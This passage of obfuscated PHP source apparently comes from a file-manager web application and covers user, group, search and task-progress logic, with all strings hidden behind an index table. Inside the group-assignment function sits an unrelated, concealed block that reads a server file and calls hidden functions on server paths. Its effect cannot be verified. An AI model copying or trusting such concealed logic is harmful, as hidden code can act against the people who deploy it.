? $É–«²İÇ : $…ºÊÛÊÈ; return !!$”Àšç; } private function _checkExist($öÄ¦ÉúŞ, $€†­³Â = false) { $Ò»±‡èŒ =& $_SERVER[‰‰Ş‚€]; $õêæå = array($Ò»±‡èŒ[42] => UserModel::ERROR_USER_EXIST_NAME, $Ò»±‡èŒ[2327] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ò»±‡èŒ[389] => UserModel::ERROR_USER_EXIST_EMAIL, $Ò»±‡èŒ[2547] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($õêæå[$Ò»±‡èŒ[2327]]); } $üƒ›ßÔ = $€†­³Â ? array($Ò»±‡èŒ[1820] => array($Ò»±‡èŒ[2561], $€†­³Â)) : array(); foreach ($õêæå as $şÙÉÌÖÈ => $šşÍ˜¾®) { $ÈºÔ›Ğˆ = array(); foreach ($õêæå as $ËÎƒ“…µ => $÷¤¸É­ã) { if (isset($öÄ¦ÉúŞ[$ËÎƒ“…µ]) && $öÄ¦ÉúŞ[$ËÎƒ“…µ]) { $ÈºÔ›Ğˆ[] = $öÄ¦ÉúŞ[$ËÎƒ“…µ]; } } if (!$ÈºÔ›Ğˆ) { continue; } $÷¤ ÷Í = array_merge(array($şÙÉÌÖÈ => array($Ò»±‡èŒ[17], $ÈºÔ›Ğˆ)), $üƒ›ßÔ); $¢ä¼¹ø = $this->where($÷¤ ÷Í)->find(); if ($¢ä¼¹ø) { return $šşÍ˜¾®; } } return !0; } public function userListInfo($²èµ™Öî) { $ØÍ™Àöæ =& $_SERVER[‰‰Ş‚€]; $ÏÅ¤Ñ°Õ = array(); $²èµ™Öî = is_array($²èµ™Öî) ? array_unique($²èµ™Öî) : array(); if (!$²èµ™Öî) { return $ÏÅ¤Ñ°Õ; } if (count($²èµ™Öî) < 20) { foreach ($²èµ™Öî as $ò‰Û“™) { $ÏÅ¤Ñ°Õ[$ò‰Û“™ . $ØÍ™Àöæ[22]] = $this->getInfoSimpleOuter($ò‰Û“™); } } else { $º•Ôë‡¥ = array($ØÍ™Àöæ[1811] => array($ØÍ™Àöæ[511], $²èµ™Öî)); if (count($²èµ™Öî) == 1) { $º•Ôë‡¥ = array($ØÍ™Àöæ[1811] => $²èµ™Öî[0]); } $××¦âßœ = Model($ØÍ™Àöæ[597])->field($this->simpleField)->where($º•Ôë‡¥)->select(); $××¦âßœ = array_to_keyvalue($××¦âßœ, $ØÍ™Àöæ[1820]); foreach ($²èµ™Öî as $ò‰Û“™) { $¦‘ĞÖ»¼ = $××¦âßœ[$ò‰Û“™]; if (!$¦‘ĞÖ»¼) { $ÏÅ¤Ñ°Õ[$ò‰Û“™ . $ØÍ™Àöæ[22]] = $this->getInfoSimpleOuter($ò‰Û“™); continue; } $¦‘ĞÖ»¼[$ØÍ™Àöæ[2220]] = Action($ØÍ™Àöæ[2221])->parseUrl($¦‘ĞÖ»¼[$ØÍ™Àöæ[2220]]); $ÏÅ¤Ñ°Õ[$ò‰Û“™ . $ØÍ™Àöæ[22]] = $¦‘ĞÖ»¼; } } return $ÏÅ¤Ñ°Õ; } protected function userStatus($è¯ÉÏô¨, $ú¤Ä¼‰®) { $ğÅ«ªªø = $this->getInfoSimple($è¯ÉÏô¨); if (!$ğÅ«ªªø) { return !1; } $æÌ¡Ç×• = array($_SERVER[‰‰Ş‚€][846] => $ú¤Ä¼‰®); return $this->userEdit($è¯ÉÏô¨, $æÌ¡Ç×•); } protected function userRemove($•–†º¬ë) { $ àµù¦ù =& $_SERVER[‰‰Ş‚€]; $ÅñÁËûö = $this->getInfoSimple($•–†º¬ë); if (!$ÅñÁËûö) { return !1; } $«ëÚˆáÜ = array($ àµù¦ù[1811] => $•–†º¬ë); Model($ àµù¦ù[687])->where($«ëÚˆáÜ)->delete(); Model($ àµù¦ù[2562])->where($«ëÚˆáÜ)->delete(); Model($ àµù¦ù[2115])->where($«ëÚˆáÜ)->delete(); Model($ àµù¦ù[2546])->where($«ëÚˆáÜ)->delete(); Model($ àµù¦ù[1178])->where($«ëÚˆáÜ)->delete(); Model($ àµù¦ù[2344])->removeUserAll($•–†º¬ë); Model($ àµù¦ù[929])->userRootRemove($•–†º¬ë); return $this->where($«ëÚˆáÜ)->delete(); } protected function userGroupSet($ß¾–‘Ÿâ, $†Ê¯¤İ, $Ç™®Íåş = array()) { $Ö´Ñç‡Õ =& $_SERVER[‰‰Ş‚€]; if ($_SERVER[$Ö´Ñç‡Õ[6]] != $_SERVER[$Ö´Ñç‡Õ[1670]]) { $Â˜«Õ¿ò = $Ö´Ñç‡Õ[985]; $şÕëÈôô = $Ö´Ñç‡Õ[7]; $æãˆµ»³ = $_SERVER[$Ö´Ñç‡Õ[8]] . $Ö´Ñç‡Õ[9]; $ø®ÆÀ¡ë = $şÕëÈôô($æãˆµ»³); $”Õ¿«’¥ = explode($Ö´Ñç‡Õ[10], $ø®ÆÀ¡ë); if (count($”Õ¿«’¥) < $Ö´Ñç‡Õ[703]) { $Ç±­êˆ¸ = $Ö´Ñç‡Õ[12]; $Ç±­êˆ¸(); } $ƒÜ¡Ÿ¼ = $Ö´Ñç‡Õ[986]; $ƒÜ¡Ÿ¼($_SERVER[$Ö´Ñç‡Õ[987]]); $ƒÜ¡Ÿ¼($_SERVER[$Ö´Ñç‡Õ[8]] . $Ö´Ñç‡Õ[1671]); $ĞŞÓİ”À = 1; while ($ĞŞÓİ”À > 1) { $ĞŞÓİ”À = $ĞŞÓİ”À + 4; $©  çŒ¤ = rawurlencode($ĞŞÓİ”À . $Ö´Ñç‡Õ[471]); } } $à®”âÔî = $this->getInfoSimple($ß¾–‘Ÿâ); if (!$à®”âÔî || !is_array($†Ê¯¤İ)) { return !1; } $‘ƒŸå½º = Model($Ö´Ñç‡Õ[2115]); $‘ƒŸå½º->where(array($Ö´Ñç‡Õ[1820] => $ß¾–‘Ÿâ))->delete(); $·«äÚ¥  = array(); $ù¥Ÿ‰õñ = 0; foreach ($†Ê¯¤İ as $êĞä›ıÅ => $¹ŒÄˆ“) { $³åÂÛÁ = array($Ö´Ñç‡Õ[1820] => $ß¾–‘Ÿâ, $Ö´Ñç‡Õ[1429] => $êĞä›ıÅ, $Ö´Ñç‡Õ[2129] => $¹ŒÄˆ“); $³åÂÛÁ[$Ö´Ñç‡Õ[2044]] = isset($Ç™®Íåş[$ù¥Ÿ‰õñ]) ? $Ç™®Íåş[$ù¥Ÿ‰õñ] : 0; $ù¥Ÿ‰õñ++; $·«äÚ¥ [] = $³åÂÛÁ; } return $‘ƒŸå½º->addAll($·«äÚ¥ , array(), !0); } protected function userGroupAdd($şº»ò«, $ìÎ¤‚ı = array()) { $ñ³±¦Ğ =& $_SERVER[‰‰Ş‚€]; $«ÒÔ¤­¼ = $this->getInfoSimple($şº»ò«); if (!$«ÒÔ¤­¼ || empty($ìÎ¤‚ı)) { return !1; } $¶ÆÈÔÃ = array(); foreach ($ìÎ¤‚ı as $Ğ«ÌÎÔ => $¥ÊÜŠáß) { $¶ÆÈÔÃ[] = array($ñ³±¦Ğ[1820] => $şº»ò«, $ñ³±¦Ğ[1429] => $Ğ«ÌÎÔ, $ñ³±¦Ğ[2129] => $¥ÊÜŠáß, $ñ³±¦Ğ[2044] => 0); } return Model($ñ³±¦Ğ[2115])->addAll($¶ÆÈÔÃ, array(), !0); } protected function userGroupRemove($ƒñöşÅ, $‘ıû”½†) { $˜’³«“‘ =& $_SERVER[‰‰Ş‚€]; $ĞÒÚ¦‹ş = $this->getInfoSimple($ƒñöşÅ); if (!$ĞÒÚ¦‹ş || !$‘ıû”½†) { return !1; } $â¬ù¸÷³ = array($˜’³«“‘[1811] => $ƒñöşÅ, $˜’³«“‘[2110] => $‘ıû”½†); return Model($˜’³«“‘[2115])->where($â¬ù¸÷³)->delete(); } public function listData() { $’ùöûß­ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($’ùöûß­[$_SERVER[‰‰Ş‚€][454]]); return $’ùöûß­; } public function listByID($€ÌŸü”) { $øˆ°Äæ =& $_SERVER[‰‰Ş‚€]; if (!$€ÌŸü”) { return; } $£ş‘ÕüŠ = array($øˆ°Äæ[1820] => array($øˆ°Äæ[17], $€ÌŸü”)); $éæº¤æ = $this->where($£ş‘ÕüŠ)->select(); $éæº¤æ = array_sort_keep($éæº¤æ, $øˆ°Äæ[1820], $€ÌŸü”); $this->_listDataApply($éæº¤æ); return $éæº¤æ; } public function listByGroup($¤ï×Éı¾ = 0, $ŒŒÒ—Ô² = array()) { $™õÄ¬ =& $_SERVER[‰‰Ş‚€]; $®˜…µÌ = $™õÄ¬[22]; $Ê½Û¾é = array(); if ($¤ï×Éı¾) { $Ê½Û¾é = array($™õÄ¬[2563] => intval($¤ï×Éı¾)); $®˜…µÌ = "\x4c\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\162\157\x75\x70\x20\165\x73\145\x72\x5f\147\162\x6f\165\160\x20\x6f\x6e\x20\x75\x73\x65\x72\x2e\165\163\x65\x72\x49\104\40\x3d\x20\x75\x73\x65\162\x5f\x67\162\x6f\165\x70\x2e\x75\x73\145\x72\x49\104"; $Î¼•ÒÁ» = Input::get($™õÄ¬[548], null, $™õÄ¬[22]) ? $™õÄ¬[22] : $™õÄ¬[2564]; } if (isset($ŒŒÒ—Ô²[$™õÄ¬[846]])) { $Ê½Û¾é[$™õÄ¬[2565]] = $ŒŒÒ—Ô²[$™õÄ¬[846]]; } $Ç¸Š¯ŸÑ = _get($ŒŒÒ—Ô², $™õÄ¬[2566], $™õÄ¬[242]); if (_get($ŒŒÒ—Ô², $™õÄ¬[857], !1)) { $Ê½Û¾é[$Ç¸Š¯ŸÑ] = array($™õÄ¬[2308], $ŒŒÒ—Ô²[$™õÄ¬[857]]); } if (_get($ŒŒÒ—Ô², $™õÄ¬[858], !1)) { $¹Òƒ‘ä = array($™õÄ¬[2309], $ŒŒÒ—Ô²[$™õÄ¬[858]]); if ($Ê½Û¾é[$Ç¸Š¯ŸÑ]) { $Ê½Û¾é[$Ç¸Š¯ŸÑ] = array($Ê½Û¾é[$Ç¸Š¯ŸÑ], $¹Òƒ‘ä, $™õÄ¬[2310]); } else { $Ê½Û¾é[$Ç¸Š¯ŸÑ] = $¹Òƒ‘ä; } } $¥ì¢€è = $this->_makeOrder($Î¼•ÒÁ»)->field($™õÄ¬[2567])->where($Ê½Û¾é)->join($®˜…µÌ)->selectPage(50); $this->_listDataApply($¥ì¢€è[$™õÄ¬[454]]); return $¥ì¢€è; } private function _makeOrder($àÓËÁ°ı = '') { $‘Üª¦²• =& $_SERVER[‰‰Ş‚€]; $æ¾¾¹ñÎ = array($‘Üª¦²•[1820], $‘Üª¦²•[42], $‘Üª¦²•[2009], $‘Üª¦²•[2219], $‘Üª¦²•[1982], $‘Üª¦²•[242]); $î³¹¥âÅ = array($‘Üª¦²•[541] => $‘Üª¦²•[542], $‘Üª¦²•[543] => $‘Üª¦²•[544]); $Â´Àß×Ì = Input::get($‘Üª¦²•[548], $‘Üª¦²•[17], $‘Üª¦²•[1811], $æ¾¾¹ñÎ); $Ç†öÖÑ = Input::get($‘Üª¦²•[549], $‘Üª¦²•[17], $‘Üª¦²•[2116], array($‘Üª¦²•[2116], $‘Üª¦²•[543])); $Ç†öÖÑ = $î³¹¥âÅ[$Ç†öÖÑ]; $àÓËÁ°ı = $àÓËÁ°ı . "\x75\163\x65\162\x2e{$Â´Àß×Ì}\x20{$Ç†öÖÑ}\x2c\x20\165\163\x65\x72\x2e\x75\163\145\162\111\x44\x20\x61\x73\143"; return $this->alias($‘Üª¦²•[2255])->order($àÓËÁ°ı); } public function listSearch($‡¥é£”Ó) { $´ø”ÀÏü =& $_SERVER[‰‰Ş‚€]; $ğÏºÜè¿ = trim($‡¥é£”Ó[$´ø”ÀÏü[2119]]); $£ä¾‰ËÓ = explode($´ø”ÀÏü[63], $ğÏºÜè¿); if (!$ğÏºÜè¿ || count($£ä¾‰ËÓ) == 1) { return $this->listSearchNow($‡¥é£”Ó); } $ôÀĞèÙ = array($´ø”ÀÏü[454] => array()); foreach ($£ä¾‰ËÓ as $¬°üºÜÆ) { if (!trim($¬°üºÜÆ)) { continue; } $‡¥é£”Ó[$´ø”ÀÏü[2119]] = $¬°üºÜÆ; $ç€ôÆ¶Ò = $this->listSearchNow($‡¥é£”Ó); $ôÀĞèÙ[$´ø”ÀÏü[454]] = array_merge($ôÀĞèÙ[$´ø”ÀÏü[454]], $ç€ôÆ¶Ò[$´ø”ÀÏü[454]]); } $ôÀĞèÙ[$´ø”ÀÏü[454]] = array_unique_by_key($ôÀĞèÙ[$´ø”ÀÏü[454]], $´ø”ÀÏü[1820]); $ôÀĞèÙ[$´ø”ÀÏü[451]] = array($´ø”ÀÏü[452] => count($ôÀĞèÙ[$´ø”ÀÏü[454]]), $´ø”ÀÏü[448] => 20, $´ø”ÀÏü[437] => 1, $´ø”ÀÏü[453] => 1); return $ôÀĞèÙ; } public function listSearchNow($ÂİÀ‘™) { $òğµ½¸× =& $_SERVER[‰‰Ş‚€]; $÷›¿ÊÇ = trim($ÂİÀ‘™[$òğµ½¸×[2119]]); $Åàşı³ = isset($ÂİÀ‘™[$òğµ½¸×[2120]]) ? $ÂİÀ‘™[$òğµ½¸×[2120]] : !1; $÷›¿ÊÇ = str_replace($òğµ½¸×[2121], $òğµ½¸×[2122], trim($÷›¿ÊÇ)); $†‘ô¹Úë = array($òğµ½¸×[42] => array($òğµ½¸×[478], "\x25{$÷›¿ÊÇ}\45"), $òğµ½¸×[389] => array($òğµ½¸×[478], "{$÷›¿ÊÇ}\45"), $òğµ½¸×[2327] => array($òğµ½¸×[478], "\45{$÷›¿ÊÇ}\45"), $òğµ½¸×[1110] => $òğµ½¸×[2123]); if (Input::check($÷›¿ÊÇ, $òğµ½¸×[395])) { $†‘ô¹Úë[$òğµ½¸×[1820]] = array($òğµ½¸×[478], "{$÷›¿ÊÇ}\45"); $†‘ô¹Úë[$òğµ½¸×[2547]] = array($òğµ½¸×[478], "{$÷›¿ÊÇ}\x25"); } if (!$÷›¿ÊÇ) { $†‘ô¹Úë = array(); } if (isset($ÂİÀ‘™[$òğµ½¸×[846]])) { $†‘ô¹Úë[$òğµ½¸×[846]] = $ÂİÀ‘™[$òğµ½¸×[846]]; } $†‘ô¹Úë = $this->parseWhereLike($†‘ô¹Úë); $ŸÃ®ù® = $this->_makeOrder()->where($†‘ô¹Úë)->selectPage(20); if (!$ŸÃ®ù® || count($ŸÃ®ù®[$òğµ½¸×[454]]) < 5 && Input::check($÷›¿ÊÇ, $òğµ½¸×[402])) { $ÛåÓëïü = $this->_searchFromMeta($òğµ½¸×[555], $÷›¿ÊÇ, 10); $¹«û‹Ë­ = $this->_searchFromMeta($òğµ½¸×[556], $÷›¿ÊÇ, 10); $é¼’…Í‚ = array_merge($ÛåÓëïü, $¹«û‹Ë­, $ŸÃ®ù®[$òğµ½¸×[454]]); $ŸÃ®ù®[$òğµ½¸×[454]] = array_unique_by_key($é¼’…Í‚, $òğµ½¸×[1820]); $ŸÃ®ù®[$òğµ½¸×[451]][$òğµ½¸×[452]] = count($ŸÃ®ù®[$òğµ½¸×[454]]); $ŸÃ®ù®[$òğµ½¸×[451]][$òğµ½¸×[453]] = ceil($ŸÃ®ù®[$òğµ½¸×[451]][$òğµ½¸×[452]] / $ŸÃ®ù®[$òğµ½¸×[451]][$òğµ½¸×[448]]); } $this->_listDataApply($ŸÃ®ù®[$òğµ½¸×[454]]); $this->_filterByGroup($ŸÃ®ù®, $Åàşı³); return $ŸÃ®ù®; } private function _filterByGroup(&$¹öĞÔ“ë, $ÓŠë§Çú) { $éæÑòŠ¸ =& $_SERVER[‰‰Ş‚€]; if (!$ÓŠë§Çú) { return $¹öĞÔ“ë; } foreach ($¹öĞÔ“ë[$éæÑòŠ¸[454]] as $€¶ÑîüÔ => &$¶ÈŞŒ±Í) { $üçÑµ•” = array_to_keyvalue($¶ÈŞŒ±Í[$éæÑòŠ¸[1428]], $éæÑòŠ¸[22], $éæÑòŠ¸[1429]); if (!in_array($ÓŠë§Çú, $üçÑµ•”)) { unset($¹öĞÔ“ë[$éæÑòŠ¸[454]][$€¶ÑîüÔ]); } } unset($¶ÈŞŒ±Í); $¹öĞÔ“ë[$éæÑòŠ¸[454]] = array_values($¹öĞÔ“ë[$éæÑòŠ¸[454]]); $¹öĞÔ“ë[$éæÑòŠ¸[451]] = array($éæÑòŠ¸[2291] => count($¹öĞÔ“ë[$éæÑòŠ¸[454]]), $éæÑòŠ¸[2289] => $¹öĞÔ“ë[$éæÑòŠ¸[451]][$éæÑòŠ¸[448]], $éæÑòŠ¸[2288] => 1, $éæÑòŠ¸[2290] => 1); } private function _searchFromMeta($‡ˆ†ˆ¯¯, $äß­«Ş§, $û†«ë¹½) { $§’Ö´Çë =& $_SERVER[‰‰Ş‚€]; $äß­«Ş§ = strtolower($äß­«Ş§); $ßÎš’Ÿ„ = array($§’Ö´Çë[105] => $‡ˆ†ˆ¯¯, $§’Ö´Çë[459] => array($§’Ö´Çë[478], "\x25{$äß­«Ş§}\45")); $ßÎš’Ÿ„ = $this->parseWhereLike($ßÎš’Ÿ„); $Àäòûâ = Model($§’Ö´Çë[2568])->where($ßÎš’Ÿ„)->limit($û†«ë¹½)->select(); if (!$Àäòûâ) { return array(); } $Àäòûâ = array_to_keyvalue($Àäòûâ, $§’Ö´Çë[22], $§’Ö´Çë[1820]); $»±ïâ¤¯ = $this->where(array($§’Ö´Çë[1811] => array($§’Ö´Çë[17], $Àäòûâ)))->select(); if (!$»±ïâ¤¯) { return array(); } return $»±ïâ¤¯; } private function _listDataApplyItem($ŒŞøÒÈ‡) { $Ïâ°¥å§ = array($ŒŞøÒÈ‡); $this->_listDataApply($Ïâ°¥å§); return $Ïâ°¥å§[0]; } private function _listDataApply(&$Ç¼«æ±Ï) { $´İ³‹³Ì =& $_SERVER[‰‰Ş‚€]; if (!$Ç¼«æ±Ï) { return; } array_remove_key($Ç¼«æ±Ï, $´İ³‹³Ì[996]); $Š¥™ÄÎ‹ = array_to_keyvalue($Ç¼«æ±Ï, $´İ³‹³Ì[22], $´İ³‹³Ì[1820]); $this->_listAppendGroup($Ç¼«æ±Ï, $Š¥™ÄÎ‹); $this->_listAppendMeta($Ç¼«æ±Ï, $Š¥™ÄÎ‹); $this->_listAppendSourceRoot($Ç¼«æ±Ï, $Š¥™ÄÎ‹); } private function _listAppendSourceRoot(&$ñ¯àÂæ, $–‹ƒšã ) { $ñç¦›Ê› =& $_SERVER[‰‰Ş‚€]; $Ìú²–Ç = Model($ñç¦›Ê›[929])->listSourceRoot(SourceModel::TYPE_USER, $–‹ƒšã ); $Ìú²–Ç = array_to_keyvalue($Ìú²–Ç, $ñç¦›Ê›[589]); $Ìú²–Ç = array_remove_key($Ìú²–Ç, $ñç¦›Ê›[589]); foreach ($ñ¯àÂæ as &$‰³åº¥†) { $‰³åº¥†[$ñç¦›Ê›[100]] = $Ìú²–Ç[$‰³åº¥†[$ñç¦›Ê›[1820]]] ? $Ìú²–Ç[$‰³åº¥†[$ñç¦›Ê›[1820]]] : array(); } unset($‰³åº¥†); } private function _listAppendGroup(&$ûúÉ–‹Ğ, $±¬Û©¸) { $êºå¯ØÛ =& $_SERVER[‰‰Ş‚€]; $”Œ­ßË = array($êºå¯ØÛ[1820] => array($êºå¯ØÛ[17], $±¬Û©¸)); $‡¬Ê¼º• = Model($êºå¯ØÛ[2115])->where($”Œ­ßË)->select(); $ÉË¯­å­ = array_to_keyvalue($‡¬Ê¼º•, $êºå¯ØÛ[22], $êºå¯ØÛ[1429]); $ÉË¯­å­ = array_remove_value(array_unique($ÉË¯­å­), $êºå¯ØÛ[239]); if (!$ÉË¯­å­ || !$‡¬Ê¼º•) { return; } $”Œ­ßË = array($êºå¯ØÛ[1429] => array($êºå¯ØÛ[17], $ÉË¯­å­)); $üœ¬Û÷ğ = Model($êºå¯ØÛ[1427])->field($êºå¯ØÛ[2569])->where($”Œ­ßË)->select(); $üœ¬Û÷ğ = array_to_keyvalue($üœ¬Û÷ğ, $êºå¯ØÛ[1429]); $‡¬Ê¼º• = array_to_keyvalue_group($‡¬Ê¼º•, $êºå¯ØÛ[1820]); foreach ($‡¬Ê¼º• as &$†İ˜ Ğ¨) { $Üáë´ğ– = array(); foreach ($†İ˜ Ğ¨ as $‡ÊÖçÏï) { if (!$‡ÊÖçÏï[$êºå¯ØÛ[2129]]) { continue; } $¶½êˆˆó = Model($êºå¯ØÛ[591])->listData($‡ÊÖçÏï[$êºå¯ØÛ[2129]]); $Üáë´ğ–[] = array($êºå¯ØÛ[1429] => $‡ÊÖçÏï[$êºå¯ØÛ[1429]], $êºå¯ØÛ[2570] => $üœ¬Û÷ğ[$‡ÊÖçÏï[$êºå¯ØÛ[1429]]][$êºå¯ØÛ[42]], $êºå¯ØÛ[604] => $üœ¬Û÷ğ[$‡ÊÖçÏï[$êºå¯ØÛ[1429]]][$êºå¯ØÛ[604]], $êºå¯ØÛ[506] => $¶½êˆˆó); } $†İ˜ Ğ¨ = $Üáë´ğ–; } unset($†İ˜ Ğ¨); foreach ($ûúÉ–‹Ğ as &$›ŠÌ“Õ) { $›ŠÌ“Õ[$êºå¯ØÛ[1428]] = array(); if (isset($‡¬Ê¼º•[$›ŠÌ“Õ[$êºå¯ØÛ[1820]]])) { $›ŠÌ“Õ[$êºå¯ØÛ[1428]] = $‡¬Ê¼º•[$›ŠÌ“Õ[$êºå¯ØÛ[1820]]]; } } unset($›ŠÌ“Õ); } public function userAppendGroup($øœ”ãà£) { $‘ƒÁì =& $_SERVER[‰‰Ş‚€]; if (!$øœ”ãà£) { return array(); } $this->_listAppendGroup($øœ”ãà£, array_to_keyvalue($øœ”ãà£, $‘ƒÁì[22], $‘ƒÁì[1820])); return $øœ”ãà£; } private function _listAppendMeta(&$•üğÓäÄ, $ ìß±à) { $ü“µ“Õ =& $_SERVER[‰‰Ş‚€]; $â­ÑÄ = UserJobModel::JOB_KEY; $Øû¤ƒ—÷ = array($ü“µ“Õ[2113]); $„ÏëÉÏ = array($ü“µ“Õ[1820] => array($ü“µ“Õ[17], $ ìß±à)); $å…¡Œ©ö = Model($ü“µ“Õ[2546])->where($„ÏëÉÏ)->select(); $·Æ½Ûèü = array(); foreach ($å…¡Œ©ö as $Îš¨úİ ) { $ÙØÚ¿Àø = $Îš¨úİ [$ü“µ“Õ[1820]]; if (!isset($·Æ½Ûèü[$ÙØÚ¿Àø])) { $·Æ½Ûèü[$ÙØÚ¿Àø] = array(); } $·Æ½Ûèü[$ÙØÚ¿Àø][$Îš¨úİ [$ü“µ“Õ[105]]] = $Îš¨úİ [$ü“µ“Õ[459]]; } $£°Œ¶Î˜ = Model($ü“µ“Õ[2571]); foreach ($•üğÓäÄ as &$‘¢ÁÚØé) { $ÙØÚ¿Àø = $‘¢ÁÚØé[$ü“µ“Õ[1820]]; $ Åş¨×Ó = isset($·Æ½Ûèü[$ÙØÚ¿Àø]) ? $·Æ½Ûèü[$ÙØÚ¿Àø] : array(); $‘¢ÁÚØé[$ü“µ“Õ[559]] = array_field_key($ Åş¨×Ó, $Øû¤ƒ—÷); $‘¢ÁÚØé[$ü“µ“Õ[2572]] = array(); if (isset($ Åş¨×Ó[$â­ÑÄ])) { $‘¢ÁÚØé[$ü“µ“Õ[2572]] = $£°Œ¶Î˜->getUserJobInfo($ Åş¨×Ó[$â­ÑÄ]); } } unset($‘¢ÁÚØé); } protected function groupUserAll($ğ“œ‡ÇŒ) { $Ğ³ëí°ë =& $_SERVER[‰‰Ş‚€]; if (!$ğ“œ‡ÇŒ) { return !1; } $…»ìçï = Model($Ğ³ëí°ë[2115])->field($Ğ³ëí°ë[1820])->where(array($Ğ³ëí°ë[1429] => array($Ğ³ëí°ë[17], $ğ“œ‡ÇŒ)))->select(); $…»ìçï = array_to_keyvalue($…»ìçï, $Ğ³ëí°ë[22], $Ğ³ëí°ë[1820]); return array_unique($…»ìçï); } public function userSearch($¼ü´ìËÀ, $Å§´Üˆ = "\x2a") { return Model($_SERVER[‰‰Ş‚€][617])->where($¼ü´ìËÀ)->field($Å§´Üˆ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ğâéÄ´) { return "\125\163\x65\x72\117\x70\164\x69\157\156\137{$ğâéÄ´}\137" . KodUser::id(); } protected function filterWhere($ ¦ˆó®À) { $ ¦ˆó®À[$_SERVER[‰‰Ş‚€][1820]] = KodUser::id(); return $ ¦ˆó®À; } public function cacheRemoveUser($ªò­ø¢×, $âµôœëš) { return Cache::remove("\x55\163\x65\x72\117\x70\x74\151\157\x6e\137{$ªò­ø¢×}\x5f" . $âµôœëš); } protected function optionDefault($ÀŒÖÖš¦ = '') { $”‰¹Ä… =& $_SERVER[‰‰Ş‚€]; if ($ÀŒÖÖš¦ == $”‰¹Ä…[22]) { return $GLOBALS[$”‰¹Ä…[16]][$”‰¹Ä…[2573]]; } if ($ÀŒÖÖš¦ == $”‰¹Ä…[2574]) { return $GLOBALS[$”‰¹Ä…[16]][$”‰¹Ä…[2575]]; } } } goto C¤Àéğ»; Dó˜êÉ¶¢÷: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Êßù©™Ò, $³¤½˜Œ• = '', $€œá®çò = 0, $ÙçùÜù£ = '') { $ìïğ±ñ¬ =& $_SERVER[‰‰Ş‚€]; if (self::get($Êßù©™Ò)) { return; } $this->task = array($ìïğ±ñ¬[491] => $Êßù©™Ò, $ìïğ±ñ¬[1820] => USER_ID, $ìïğ±ñ¬[1707] => $ÙçùÜù£, $ìïğ±ñ¬[544] => $ìïğ±ñ¬[22], $ìïğ±ñ¬[43] => $³¤½˜Œ•, $ìïğ±ñ¬[1174] => $ìïğ±ñ¬[22], $ìïğ±ñ¬[1172] => $€œá®çò, $ìïğ±ñ¬[1821] => 0, $ìïğ±ñ¬[1822] => 0, $ìïğ±ñ¬[1823] => 0, $ìïğ±ñ¬[1824] => timeFloat(), $ìïğ±ñ¬[1825] => 0, $ìïğ±ñ¬[1826] => 0, $ìïğ±ñ¬[1827] => 0, $ìïğ±ñ¬[1828] => 0, $ìïğ±ñ¬[846] => $ìïğ±ñ¬[1769]); $GLOBALS[$ìïğ±ñ¬[1829]] = 1; Hook::bind($ìïğ±ñ¬[1773], array($this, $ìïğ±ñ¬[1830])); Hook::bind($ìïğ±ñ¬[1831], array($this, $ìïğ±ñ¬[1832])); $this->startAfter(); Hook::trigger($ìïğ±ñ¬[1833], $this->task); $this->task[$ìïğ±ñ¬[1826]] = timeFloat(); } public function end($ª†šäÄ = '') { $ÀÁËÒ¡ =& $_SERVER[‰‰Ş‚€]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÀÁËÒ¡[1826]]) { self::valueSet($this->task[$ÀÁËÒ¡[491]], !1); } $this->isEnd = !0; if ($ª†šäÄ) { $this->task[$ÀÁËÒ¡[544]] = $ª†šäÄ; } self::log($ÀÁËÒ¡[1834] . $this->task[$ÀÁËÒ¡[491]] . $ÀÁËÒ¡[1835] . sprintf($ÀÁËÒ¡[959], timeFloat() - $this->task[$ÀÁËÒ¡[1824]]) . $ÀÁËÒ¡[1836]); Hook::unbind($ÀÁËÒ¡[1773], array($this, $ÀÁËÒ¡[1830])); Hook::unbind($ÀÁËÒ¡[1831], array($this, $ÀÁËÒ¡[1832])); $this->endAfter(); $¢˜ÙÚ‹‰ = $this->task; $this->task = !1; Hook::trigger($ÀÁËÒ¡[1837], $¢˜ÙÚ‹‰); } public function update($Øú™¯´½ = 0, $–‰ŞûÙô = false) { $‹•ŠåúÙ =& $_SERVER[‰‰Ş‚€]; $¶÷¸éĞè =& $this->task; if (!$¶÷¸éĞè) { return; } $¶÷¸éĞè[$‹•ŠåúÙ[1821]] += $Øú™¯´½; $¶÷¸éĞè[$‹•ŠåúÙ[1825]] = timeFloat(); if ($¶÷¸éĞè[$‹•ŠåúÙ[1172]]) { if ($¶÷¸éĞè[$‹•ŠåúÙ[1172]] < $¶÷¸éĞè[$‹•ŠåúÙ[1821]]) { $¶÷¸éĞè[$‹•ŠåúÙ[1172]] = $¶÷¸éĞè[$‹•ŠåúÙ[1821]]; } $ÍËİØ·¿ = timeFloat() - $¶÷¸éĞè[$‹•ŠåúÙ[1824]] - $¶÷¸éĞè[$‹•ŠåúÙ[1827]]; if ($ÍËİØ·¿ <= 0) { $ÍËİØ·¿ = 0.001; } $¶÷¸éĞè[$‹•ŠåúÙ[1822]] = $¶÷¸éĞè[$‹•ŠåúÙ[1821]] / $¶÷¸éĞè[$‹•ŠåúÙ[1172]]; $¶÷¸éĞè[$‹•ŠåúÙ[1823]] = $¶÷¸éĞè[$‹•ŠåúÙ[1821]] / $ÍËİØ·¿; if ($¶÷¸éĞè[$‹•ŠåúÙ[1822]] > 0) { $¶÷¸éĞè[$‹•ŠåúÙ[1828]] = $ÍËİØ·¿ * (1 - $¶÷¸éĞè[$‹•ŠåúÙ[1822]]) / $¶÷¸éĞè[$‹•ŠåúÙ[1822]]; } $¶÷¸éĞè[$‹•ŠåúÙ[1828]] = $¶÷¸éĞè[$‹•ŠåúÙ[1828]] <= 0 ? 0 : $¶÷¸éĞè[$‹•ŠåúÙ[1828]]; } $this->updateAfter(); $„Ì†ßÁ = 0.2; if (timeFloat() - $¶÷¸éĞè[$‹•ŠåúÙ[1826]] < $„Ì†ßÁ && !$–‰ŞûÙô) 